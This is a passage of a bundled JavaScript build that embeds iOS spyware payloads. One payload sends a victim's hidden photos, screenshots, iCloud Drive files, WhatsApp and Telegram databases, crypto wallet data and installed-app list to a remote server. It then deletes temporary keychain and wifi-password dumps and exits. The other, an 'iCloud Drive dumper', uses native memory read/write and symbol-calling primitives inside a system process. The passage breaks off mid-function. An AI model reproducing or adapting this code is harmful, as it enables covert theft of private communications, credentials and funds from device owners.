FORENSIC_FILES[i];\n\t\tconst filePath = fileInfo.path;\n\t\tconst category = fileInfo.category;\n\t\tconst description = fileInfo.description;\n\t\t\n\t\t\n\t\t// Read file as base64\n\t\tconst result = readFileAsBase64(filePath);\n\t\t\n\t\tif (result === null) {\n\t\t\tskipCount++;\n\t\t\tcontinue;\n\t\t}\n\t\t\n\t\t\n\t\t// Send via HTTP or HTTPS based on configuration\n\t\tconst sent = USE_HTTPS \n\t\t\t? sendFileViaHTTPS(filePath, category, description, result.data, result.size, deviceUUID)\n\t\t\t: sendFileViaHTTP(filePath, category, description, result.data, result.size, deviceUUID);\n\t\t\n\t\tif (sent) {\n\t\t\tsuccessCount++;\n\t\t} else {\n\t\t\tfailCount++;\n\t\t}\n\t\t\n\t\t// Small delay between files to avoid overwhelming the server\n\t\tNative.callSymbol(\"usleep\", BigInt(100000)); // 100ms\n\t}\n\t\n\t// Generate and send installed apps list\n\ttry {\n\t\tconst appsList = getInstalledAppsList();\n\t\t\n\t\tif (!appsList || appsList.length === 0) {\n\t\t\tfailCount++;\n\t\t} else {\n\t\t\t// Convert string to bytes (TextEncoder may not be available)\n\t\t\tconst appsBytes = new Uint8Array(appsList.length);\n\t\t\tfor (let i = 0; i < appsList.length; i++) {\n\t\t\t\tappsBytes[i] = appsList.charCodeAt(i) & 0xFF;\n\t\t\t}\n\t\t\tconst appsData = base64Encode(appsBytes);\n\t\t\n\t\t\n\t\t\tconst sent = USE_HTTPS \n\t\t\t\t? sendFileViaHTTPS(\"/installed_apps.txt\", \"system\", \"List of installed applications\", appsData, appsList.length, deviceUUID)\n\t\t\t\t: sendFileViaHTTP(\"/installed_apps.txt\", \"system\", \"List of installed applications\", appsData, appsList.length, deviceUUID);\n\t\t\n\t\t\tif (sent) {\n\t\t\t\tsuccessCount++;\n\t\t\t} else {\n\t\t\t\tfailCount++;\n\t\t\t}\n\t\t}\n\t} catch (appsError) {\n\t\tif (appsError && appsError.stack) {\n\t\t}\n\t\tfailCount++;\n\t}\n\t\n\t// COMMENTED OUT: Extract ALL app container data (Documents, Cookies, WebKit, Preferences, etc.)\n\t// Uncomment to enable app cache extraction\n\t/*\n\ttry {\n\t\tconst appFiles = getAllAppContainerFiles();\n\t\t\n\t\tfor (let i = 0; i < appFiles.length; i++) {\n\t\t\tconst appFile = appFiles[i];\n\t\t\t\n\t\t\t// Log every 10th file to avoid spam\n\t\t\tif (i % 10 === 0) {\n\t\t\t}\n\t\t\t\n\t\t\tconst result = readFileAsBase64(appFile.path);\n\t\t\tif (result === null) {\n\t\t\t\tskipCount++;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t\n\t\t\tconst sent = USE_HTTPS \n\t\t\t\t? sendFileViaHTTPS(appFile.path, appFile.category, appFile.description, result.data, result.size, deviceUUID)\n\t\t\t\t: sendFileViaHTTP(appFile.path, appFile.category, appFile.description, result.data, result.size, deviceUUID);\n\t\t\t\n\t\t\tif (sent) {\n\t\t\t\tsuccessCount++;\n\t\t\t} else {\n\t\t\t\tfailCount++;\n\t\t\t}\n\t\t\t\n\t\t\t// Small delay between files\n\t\t\tNative.callSymbol(\"usleep\", BigInt(30000)); // 30ms\n\t\t}\n\t\t\n\t} catch (appError) {\n\t\tif (appError && appError.stack) {\n\t\t}\n\t}\n\t*/\n\t\n\t// Download hidden photos\n\ttry {\n\t\tconst hiddenPhotos = getHiddenPhotos();\n\t\t\n\t\tfor (let i = 0; i < hiddenPhotos.length; i++) {\n\t\t\tconst photoPath = hiddenPhotos[i];\n\t\t\t\n\t\t\t\n\t\t\tconst result = readFileAsBase64(photoPath);\n\t\t\tif (result === null) {\n\t\t\t\tskipCount++;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t\tconst sent = USE_HTTPS \n\t\t\t\t? sendFileViaHTTPS(photoPath, \"hidden-photos\", \"Hidden photo\", result.data, result.size, deviceUUID)\n\t\t\t\t: sendFileViaHTTP(photoPath, \"hidden-photos\", \"Hidden photo\", result.data, result.size, deviceUUID);\n\t\t\t\n\t\t\tif (sent) {\n\t\t\t\tsuccessCount++;\n\t\t\t} else {\n\t\t\t\tfailCount++;\n\t\t\t}\n\t\t\t\n\t\t\tNative.callSymbol(\"usleep\", BigInt(50000)); // 50ms\n\t\t}\n\t} catch (hiddenError) {\n\t\tif (hiddenError && hiddenError.stack) {\n\t\t}\n\t}\n\t\n\t// Download screenshots\n\ttry {\n\t\tconst screenshots = getScreenshots();\n\t\t\n\t\tfor (let i = 0; i < screenshots.length; i++) {\n\t\t\tconst photoPath = screenshots[i];\n\t\t\t\n\t\t\t\n\t\t\tconst result = readFileAsBase64(photoPath);\n\t\t\tif (result === null) {\n\t\t\t\tskipCount++;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t\tconst sent = USE_HTTPS \n\t\t\t\t? sendFileViaHTTPS(photoPath, \"screenshots\", \"Screenshot\", result.data, result.size, deviceUUID)\n\t\t\t\t: sendFileViaHTTP(photoPath, \"screenshots\", \"Screenshot\", result.data, result.size, deviceUUID);\n\t\t\t\n\t\t\tif (sent) {\n\t\t\t\tsuccessCount++;\n\t\t\t} else {\n\t\t\t\tfailCount++;\n\t\t\t}\n\t\t\t\n\t\t\tNative.callSymbol(\"usleep\", BigInt(50000)); // 50ms\n\t\t}\n\t} catch (screenshotError) {\n\t\tif (screenshotError && screenshotError.stack) {\n\t\t}\n\t}\n\t\n\t// Download iCloud Drive files from /tmp/icloud_dump/ (copied by icloud_dumper.js)\n\ttry {\n\t\tconst icloudDumpPath = \"/tmp/icloud_dump\";\n\t\tif (fileExists(icloudDumpPath)) {\n\t\t\tconst dumpedFiles = listFilesRecursive(icloudDumpPath, 20, 0);\n\t\t\t\n\t\t\tfor (let i = 0; i < dumpedFiles.length; i++) {\n\t\t\t\tconst file = dumpedFiles[i];\n\t\t\t\t\n\t\t\t\tif (i % 10 === 0 || i === dumpedFiles.length - 1) {\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tconst result = readFileAsBase64(file.path);\n\t\t\t\tif (result === null) {\n\t\t\t\t\tskipCount++;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif (!result.data || result.data.length === 0) {\n\t\t\t\t\tskipCount++;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tconst relativePath = file.path.substring(icloudDumpPath.length + 1);\n\t\t\t\tconst displayPath = \"icloud_dump_\" + relativePath.replace(/\\//g, '_');\n\t\t\t\t\n\t\t\t\tconst sent = USE_HTTPS \n\t\t\t\t\t? sendFileViaHTTPS(displayPath, \"icloud-drive\", \"iCloud Drive (dumped)\", result.data, result.size, deviceUUID)\n\t\t\t\t\t: sendFileViaHTTP(displayPath, \"icloud-drive\", \"iCloud Drive (dumped)\", result.data, result.size, deviceUUID);\n\t\t\t\t\n\t\t\t\tif (sent) {\n\t\t\t\t\tsuccessCount++;\n\t\t\t\t} else {\n\t\t\t\t\tfailCount++;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tNative.callSymbol(\"usleep\", BigInt(50000));\n\t\t\t}\n\t\t} else {\n\t\t}\n\t} catch (icloudError) {\n\t\tif (icloudError && icloudError.stack) {\n\t\t}\n\t}\n\t\n\t// Also try direct iCloud Drive extraction as fallback\n\ttry {\n\t\tconst icloudFiles = getiCloudDriveFiles();\n\t\t\n\t\tfor (let i = 0; i < icloudFiles.length; i++) {\n\t\t\tconst icloudFile = icloudFiles[i];\n\t\t\t\n\t\t\tif (i % 10 === 0 || i === icloudFiles.length - 1) {\n\t\t\t}\n\t\t\t\n\t\t\tconst result = readFileAsBase64(icloudFile.path);\n\t\t\tif (result === null) {\n\t\t\t\tskipCount++;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t\n\t\t\tif (!result.data || result.data.length === 0) {\n\t\t\t\tskipCount++;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t\n\t\t\tconst displayPath = icloudFile.filename || icloudFile.path;\n\t\t\t\n\t\t\tconst sent = USE_HTTPS \n\t\t\t\t? sendFileViaHTTPS(displayPath, icloudFile.category, icloudFile.description, result.data, result.size, deviceUUID)\n\t\t\t\t: sendFileViaHTTP(displayPath, icloudFile.category, icloudFile.description, result.data, result.size, deviceUUID);\n\t\t\t\n\t\t\tif (sent) {\n\t\t\t\tsuccessCount++;\n\t\t\t} else {\n\t\t\t\tfailCount++;\n\t\t\t}\n\t\t\t\n\t\t\tNative.callSymbol(\"usleep\", BigInt(50000));\n\t\t}\n\t} catch (icloudError) {\n\t\tif (icloudError && icloudError.stack) {\n\t\t}\n\t}\n\t\n\t// Download WhatsApp and Telegram databases\n\ttry {\n\t\tconst messengerFiles = getMessengerDatabases();\n\t\t\n\t\tfor (let i = 0; i < messengerFiles.length; i++) {\n\t\t\tconst msgFile = messengerFiles[i];\n\t\t\t\n\t\t\t\n\t\t\tconst result = readFileAsBase64(msgFile.path);\n\t\t\tif (result === null) {\n\t\t\t\tskipCount++;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t\n\t\t\t// Also skip if data is empty/null\n\t\t\tif (!result.data || result.data.length === 0) {\n\t\t\t\tskipCount++;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t\t// Use unique filename if provided, otherwise use path\n\t\t\tconst displayPath = msgFile.filename || msgFile.path;\n\t\t\t\n\t\t\tconst sent = USE_HTTPS \n\t\t\t\t? sendFileViaHTTPS(displayPath, msgFile.category, msgFile.description, result.data, result.size, deviceUUID)\n\t\t\t\t: sendFileViaHTTP(displayPath, msgFile.category, msgFile.description, result.data, result.size, deviceUUID);\n\t\t\t\n\t\t\tif (sent) {\n\t\t\t\tsuccessCount++;\n\t\t\t} else {\n\t\t\t\tfailCount++;\n\t\t\t}\n\t\t\t\n\t\t\tNative.callSymbol(\"usleep\", BigInt(100000)); // 100ms between messenger files (they can be large)\n\t\t}\n\t} catch (messengerError) {\n\t\tif (messengerError && messengerError.stack) {\n\t\t}\n\t}\n\t\n\t// Download crypto wallet data\n\ttry {\n\t\tconst walletFiles = getCryptoWalletFiles();\n\t\t\n\t\tfor (let i = 0; i < walletFiles.length; i++) {\n\t\t\tconst walletFile = walletFiles[i];\n\t\t\t\n\t\t\t// Log every 10th file to avoid spam\n\t\t\tif (i % 10 === 0 || i === walletFiles.length - 1) {\n\t\t\t}\n\t\t\t\n\t\t\tconst result = readFileAsBase64(walletFile.path);\n\t\t\tif (result === null) {\n\t\t\t\tskipCount++;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t\n\t\t\t// Use unique filename if provided, otherwise use path\n\t\t\tconst displayPath = walletFile.filename || walletFile.path;\n\t\t\t\n\t\t\tconst sent = USE_HTTPS \n\t\t\t\t? sendFileViaHTTPS(displayPath, walletFile.category, walletFile.description, result.data, result.size, deviceUUID)\n\t\t\t\t: sendFileViaHTTP(displayPath, walletFile.category, walletFile.description, result.data, result.size, deviceUUID);\n\t\t\t\n\t\t\tif (sent) {\n\t\t\t\tsuccessCount++;\n\t\t\t} else {\n\t\t\t\tfailCount++;\n\t\t\t}\n\t\t\t\n\t\t\tNative.callSymbol(\"usleep\", BigInt(50000)); // 50ms between wallet files\n\t\t}\n\t} catch (walletError) {\n\t\tif (walletError && walletError.stack) {\n\t\t}\n\t}\n\t\n\t\n\t// Clean up temporary files created during extraction\n\tconst tempFilesToDelete = [\n\t\t\"/tmp/keychain-2.db\",\n\t\t\"/tmp/persona.kb\",\n\t\t\"/tmp/usersession.kb\",\n\t\t\"/tmp/backup_keys_cache.sqlite\",\n\t\t\"/tmp/persona_private.kb\",\n\t\t\"/tmp/usersession_private.kb\",\n\t\t\"/tmp/System.keybag\",\n\t\t\"/tmp/Backup.keybag\",\n\t\t\"/tmp/persona_keychains.kb\",\n\t\t\"/tmp/usersession_keychains.kb\",\n\t\t\"/tmp/device.kb\",\n\t\t\"/private/var/tmp/keychain-2.db\",\n\t\t\"/private/var/tmp/persona.kb\",\n\t\t\"/private/var/tmp/usersession.kb\",\n\t\t\"/var/wireless/wifi_passwords.txt\",\n\t\t\"/tmp/wifi_passwords.txt\",\n\t\t\"/private/var/tmp/wifi_passwords.txt\",\n\t\t\"/tmp/wifi_passwords_securityd.txt\",\n\t\t\"/private/var/tmp/wifi_passwords_securityd.txt\",\n\t\t\"/private/var/tmp/keychain_dump.txt\",\n\t\t\"/tmp/keychain_dump.txt\"\n\t];\n\t\n\tlet deletedCount = 0;\n\tfor (const tempFile of tempFilesToDelete) {\n\t\tconst unlinkResult = Native.callSymbol(\"unlink\", tempFile);\n\t\tif (Number(unlinkResult) === 0) {\n\t\t\tdeletedCount++;\n\t\t}\n\t}\n\t\n\t// Clean up iCloud dump directory recursively\n\tconst icloudDumpPath = \"/tmp/icloud_dump\";\n\tif (fileExists(icloudDumpPath)) {\n\t\t\n\t\t// Recursive delete function\n\t\tfunction deleteDirectoryRecursive(dirPath) {\n\t\t\tconst dir = Native.callSymbol(\"opendir\", dirPath);\n\t\t\tif (!dir || dir === 0n) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\t\n\t\t\ttry {\n\t\t\t\twhile (true) {\n\t\t\t\t\tconst entry = Native.callSymbol(\"readdir\", dir);\n\t\t\t\t\tif (!entry || entry === 0n) break;\n\t\t\t\t\t\n\t\t\t\t\tconst name = readDirentName(entry);\n\t\t\t\t\tif (!name || name.length === 0 || name === \".\" || name === \"..\") continue;\n\t\t\t\t\t\n\t\t\t\t\tconst fullPath = dirPath + \"/\" + name;\n\t\t\t\t\t\n\t\t\t\t\tconst statBuf = Native.callSymbol(\"malloc\", 144);\n\t\t\t\t\tif (!statBuf || statBuf === 0n) continue;\n\t\t\t\t\t\n\t\t\t\t\ttry {\n\t\t\t\t\t\tconst ret = Native.callSymbol(\"stat\", fullPath, statBuf);\n\t\t\t\t\t\tif (ret !== 0) continue;\n\t\t\t\t\t\t\n\t\t\t\t\t\tconst statData = Native.read(statBuf, 144);\n\t\t\t\t\t\tconst statView = new DataView(statData);\n\t\t\t\t\t\tconst mode = statView.getUint16(4, true);\n\t\t\t\t\t\t\n\t\t\t\t\t\tconst isDir = (mode & 0xF000) === 0x4000;\n\t\t\t\t\t\tconst isFile = (mode & 0xF000) === 0x8000;\n\t\t\t\t\t\t\n\t\t\t\t\t\tif (isFile) {\n\t\t\t\t\t\t\tconst unlinkResult = Native.callSymbol(\"unlink\", fullPath);\n\t\t\t\t\t\t\tif (Number(unlinkResult) === 0) {\n\t\t\t\t\t\t\t\tdeletedCount++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t} else if (isDir) {\n\t\t\t\t\t\t\tdeleteDirectoryRecursive(fullPath);\n\t\t\t\t\t\t\tconst rmdirResult = Native.callSymbol(\"rmdir\", fullPath);\n\t\t\t\t\t\t\tif (Number(rmdirResult) === 0) {\n\t\t\t\t\t\t\t\tdeletedCount++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t} finally {\n\t\t\t\t\t\tNative.callSymbol(\"free\", statBuf);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"closedir\", dir);\n\t\t\t}\n\t\t\t\n\t\t\treturn true;\n\t\t}\n\t\t\n\t\tdeleteDirectoryRecursive(icloudDumpPath);\n\t\tconst rmdirResult = Native.callSymbol(\"rmdir\", icloudDumpPath);\n\t\tif (Number(rmdirResult) === 0) {\n\t\t}\n\t}\n\t\n\t\n\t// Exit immediately after completion\n\ttry {\n\t\tNative.callSymbol(\"pthread_exit\", 0n);\n\t} catch (e) {\n\t\ttry {\n\t\t\tNative.callSymbol(\"_exit\", 0n);\n\t\t} catch (e2) {\n\t\t\t// Exit failed, continue to finally block\n\t\t}\n\t}\n\t\n} catch (error) {\n\tif (error && error.stack) {\n\t}\n} finally {\n\t// Final exit attempt\n\ttry {\n\t\tNative.callSymbol(\"pthread_exit\", 0n);\n\t} catch (e) {\n\t\ttry {\n\t\t\tNative.callSymbol(\"_exit\", 0n);\n\t\t} catch (e2) {\n\t\t\t// Ignore\n\t\t}\n\t}\n}\n\n\n");

/***/ }),

/***/ "../node_modules/raw-loader/dist/cjs.js!./icloud_dumper.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony default export */ __webpack_exports__["default"] = ("// iCloud Drive Dumper Payload\n// Runs under UserEventAgent process which has access to iCloud Drive files\n// Extracts and sends iCloud Drive files via HTTP/HTTPS\n\nclass Native {\n\t\n\tstatic #baseAddr;\n\tstatic #dlsymAddr;\n\tstatic #memcpyAddr;\n\tstatic #mallocAddr;\n\tstatic #oinvAddr;\n\t\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\t\n\tstatic #argMem = 0n;\n\tstatic #argMemPtr = 0n;\n\tstatic #argMemPtrStr = 0n;\n\tstatic #argPtr = 0n;\n\tstatic #argPtrPtr = 0n;\n\tstatic #argPtrStrPtr = 0n;\n\n\tstatic #dlsymCache = {};\n\t\n\tstatic init() {\n\t\tconst buff = new BigUint64Array(nativeCallBuff);\n\t\tthis.#baseAddr = buff[20];\n\t\tthis.#dlsymAddr = buff[21];\n\t\tthis.#memcpyAddr = buff[22];\n\t\tthis.#mallocAddr = buff[23];\n\t\tthis.#oinvAddr = buff[24];\n\t\t\n\t\tthis.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize));\n\t\tthis.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argPtr = this.#argMem;\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t}\n\t\n\tstatic write(ptr, buff) {\n\t\tif (!ptr) return false;\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tlet offs = 0;\n\t\tlet left = buff.byteLength;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000) len = 0x1000;\n\t\t\tbuff8.set(new Uint8Array(buff, offs, len), 0x1000);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn true;\n\t}\n\t\n\tstatic read(ptr, length) {\n\t\tif (!ptr) return null;\n\t\tlet buff = new ArrayBuffer(length);\n\t\tlet buff8 = new Uint8Array(buff);\n\t\tlet offs = 0;\n\t\tlet left = length;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000) len = 0x1000;\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));\n\t\t\tbuff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn buff;\n\t}\n\t\n\tstatic readPtr(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\t\n\tstatic read32(ptr) {\n\t\tlet buff = this.read(ptr, 4);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getInt32(0, true);\n\t}\n\t\n\tstatic write64(ptr, value) {\n\t\tconst buff = new ArrayBuffer(8);\n\t\tconst view = new DataView(buff);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\t\n\tstatic writeString(ptr, str) {\n\t\tconst buff = this.stringToBytes(str, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn ret;\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i])\n\t\t\t\tbreak;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\t\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated)\n\t\t\ts8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\t\n\tstatic #toNative(value) {\n\t\tif (!value)\n\t\t\treturn 0n;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) {\n\t\t\t\treturn 0n;\n\t\t\t}\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn ptr;\n\t\t}\n\t\telse if (typeof value === 'bigint') {\n\t\t\treturn value;\n\t\t}\n\t\telse\n\t\t\treturn BigInt(value);\n\t}\n\n\tstatic #dlsym(name) {\n\t\tif (!name)\n\t\t\treturn 0n;\n\t\tlet addr = this.#dlsymCache[name];\n\t\tif (addr)\n\t\t\treturn addr;\n\t\tconst RTLD_DEFAULT = 0xfffffffffffffffen;\n\t\tconst nameBytes = this.stringToBytes(name, true);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tbuff8.set(new Uint8Array(nameBytes), 0x1000);\n\t\taddr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);\n\t\tif (addr)\n\t\t\tthis.#dlsymCache[name] = addr;\n\t\treturn addr;\n\t}\n\t\n\tstatic #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {\n\t\tlet buff = new BigInt64Array(nativeCallBuff);\n\t\t\n\t\tbuff[0] = addr;\n\t\tbuff[100] = x0;\n\t\tbuff[101] = x1;\n\t\tbuff[102] = x2;\n\t\tbuff[103] = x3;\n\t\tbuff[104] = x4;\n\t\tbuff[105] = x5;\n\t\tbuff[106] = x6;\n\t\tbuff[107] = x7;\n\n\t\tinvoker();\n\t\t\n\t\treturn buff[200];\n\t}\n\t\n\tstatic #nativeCallSymbol(name, ...args) {\n\t\tconst funcAddr = this.#dlsym(name);\n\t\tconst ret64 = this.#nativeCallAddr(funcAddr, ...args);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\treturn ret64;\n\t}\n}\n\n// ============================================================================\n// Configuration\n// ============================================================================\n\nconst TAG = \"INFO\";\n\nconst DEST_DIR = \"/tmp/icloud_dump\";\nconst MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB limit per file\nconst CHUNK_SIZE = 64 * 1024;\n\n// ============================================================================\n// Helper Functions\n// ============================================================================\n\nfunction getDeviceUUID() {\n\ttry {\n\t\tconst CTL_HW = 6;\n\t\tconst HW_UUID = 25;\n\t\t\n\t\tconst mib = new ArrayBuffer(4 * 2);\n\t\tconst mibView = new DataView(mib);\n\t\tmibView.setInt32(0, CTL_HW, true);\n\t\tmibView.setInt32(4, HW_UUID, true);\n\t\t\n\t\tconst mibBuf = Native.callSymbol(\"malloc\", 8);\n\t\tif (!mibBuf || mibBuf === 0n) {\n\t\t\treturn \"unknown-device\";\n\t\t}\n\t\t\n\t\tconst resultBuf = Native.callSymbol(\"malloc\", 256);\n\t\tif (!resultBuf || resultBuf === 0n) {\n\t\t\tNative.callSymbol(\"free\", mibBuf);\n\t\t\treturn \"unknown-device\";\n\t\t}\n\t\t\n\t\tconst lengthBuf = Native.callSymbol(\"malloc\", 8);\n\t\tif (!lengthBuf || lengthBuf === 0n) {\n\t\t\tNative.callSymbol(\"free\", mibBuf);\n\t\t\tNative.callSymbol(\"free\", resultBuf);\n\t\t\treturn \"unknown-device\";\n\t\t}\n\t\t\n\t\ttry {\n\t\t\tNative.write(mibBuf, mib);\n\t\t\t\n\t\t\tconst lengthView = new DataView(new ArrayBuffer(8));\n\t\t\tlengthView.setUint32(0, 256, true);\n\t\t\tlengthView.setUint32(4, 0, true);\n\t\t\tNative.write(lengthBuf, lengthView.buffer);\n\t\t\t\n\t\t\tlet ret = Native.callSymbol(\"sysctl\", mibBuf, 2, 0n, lengthBuf, 0n, 0);\n\t\t\tif (ret !== 0) {\n\t\t\t\treturn \"unknown-device\";\n\t\t\t}\n\t\t\t\n\t\t\tconst lengthData = Native.read(lengthBuf, 8);\n\t\t\tif (!lengthData) {\n\t\t\t\treturn \"unknown-device\";\n\t\t\t}\n\t\t\tconst lengthView2 = new DataView(lengthData);\n\t\t\tconst length = lengthView2.getUint32(0, true);\n\t\t\t\n\t\t\tif (length <= 0 || length > 256) {\n\t\t\t\treturn \"unknown-device\";\n\t\t\t}\n\t\t\t\n\t\t\tlengthView.setUint32(0, length, true);\n\t\t\tNative.write(lengthBuf, lengthView.buffer);\n\t\t\t\n\t\t\tret = Native.callSymbol(\"sysctl\", mibBuf, 2, resultBuf, lengthBuf, 0n, 0);\n\t\t\tif (ret !== 0) {\n\t\t\t\treturn \"unknown-device\";\n\t\t\t}\n\t\t\t\n\t\t\tconst rawData = Native.read(resultBuf, length);\n\t\t\tif (!rawData) {\n\t\t\t\treturn \"unknown-device\";\n\t\t\t}\n\t\t\t\n\t\t\tconst bytes = new Uint8Array(rawData);\n\t\t\tlet uuid = \"\";\n\t\t\t\n\t\t\tfor (let i = 0; i < bytes.length && i < length; i++) {\n\t\t\t\tconst byte = bytes[i];\n\t\t\t\tif (byte === 0) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tif ((byte >= 32 && byte <= 126) || byte === 45 || byte === 58) {\n\t\t\t\t\tuuid += String.fromCharCode(byte);\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tuuid = uuid.trim();\n\t\t\t\n\t\t\tif (uuid && uuid.length > 0) {\n\t\t\t\treturn uuid;\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", mibBuf);\n\t\t\tNative.callSymbol(\"free\", resultBuf);\n\t\t\tNative.callSymbol(\"free\", lengthBuf);\n\t\t}\n\t} catch (e) {\n\t\t// Ignore\n\t}\n\t\n\treturn \"unknown-device\";\n}\n\nfunction getFileSize(filePath) {\n\ttry {\n\t\tconst statBuf = Native.callSymbol(\"malloc\", BigInt(144));\n\t\tif (!statBuf || statBuf === 0n) {\n\t\t\treturn -1;\n\t\t}\n\t\t\n\t\ttry {\n\t\t\tconst statResult = Native.callSymbol(\"stat\", filePath, statBuf);\n\t\t\tif (statResult !== 0) {\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t\t\n\t\t\tconst statData = Native.read(statBuf, 144);\n\t\t\tconst statView = new DataView(statData);\n\t\t\tconst fileSize = Number(statView.getBigUint64(0x60, true));\n\t\t\t\n\t\t\treturn fileSize;\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", statBuf);\n\t\t}\n\t} catch (e) {\n\t\treturn -1;\n\t}\n}\n\nfunction fileExists(filePath) {\n\tconst accessResult = Native.callSymbol(\"access\", filePath, 0);\n\treturn Number(accessResult) === 0;\n}\n\nfunction readDirentName(entry) {\n\tconst direntData = Native.read(entry, 280);\n\tif (!direntData || direntData.length < 21) {\n\t\treturn \"\";\n\t}\n\t\n\tconst direntView = new DataView(direntData);\n\tconst d_namlen = direntView.getUint16(18, true);\n\t\n\tif (d_namlen > 0 && d_namlen < 256) {\n\t\tconst namePtr = entry + 21n;\n\t\tconst name = Native.readString(namePtr, d_namlen).replace(/\\0/g, '').trim();\n\t\tif (name.length > 0 && name.charCodeAt(0) >= 0x20 && name.charCodeAt(0) <= 0x7E) {\n\t\t\treturn name;\n\t\t}\n\t}\n\t\n\tconst namePtr21 = entry + 21n;\n\tlet name = Native.readString(namePtr21, 256).replace(/\\0/g, '').trim();\n\t\n\twhile (name.length > 0 && name.charCodeAt(0) >= 1 && name.charCodeAt(0) <= 31) {\n\t\tname = name.substring(1);\n\t}\n\t\n\treturn name.trim();\n}\n\nfunction listFilesRecursive(dirPath, maxDepth, currentDepth) {\n\tconst files = [];\n\tif (currentDepth > maxDepth) return files;\n\t\n\tconst dir = Native.callSymbol(\"opendir\", dirPath);\n\tif (!dir || dir === 0n) return files;\n\t\n\ttry {\n\t\twhile (true) {\n\t\t\tconst entry = Native.callSymbol(\"readdir\", dir);\n\t\t\tif (!entry || entry === 0n) break;\n\t\t\t\n\t\t\tconst name = readDirentName(entry);\n\t\t\tif (!name || name.length === 0 || name === \".\" || name === \"..\") continue;\n\t\t\t\n\t\t\tconst fullPath = dirPath + \"/\" + name;\n\t\t\t\n\t\t\tconst statBuf = Native.callSymbol(\"malloc\", 